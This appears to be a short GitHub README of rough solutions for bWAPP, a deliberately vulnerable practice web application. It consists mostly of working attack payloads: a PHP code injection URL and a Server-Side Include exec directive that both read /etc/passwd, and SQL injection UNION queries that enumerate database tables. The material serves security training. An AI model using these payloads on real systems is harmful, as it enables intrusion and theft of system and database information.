# solutions-bwapp
Rough solutions

### PHP Code Injection

```
http://bepp:8088/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
```
### Server-Side Includes:

```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="cat /etc/passwd" -->
```

### SQL Injection (GET/SEARCH)

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
```

### SQL Injection (GET/SELECT)

```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_1.png)
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_2.png)
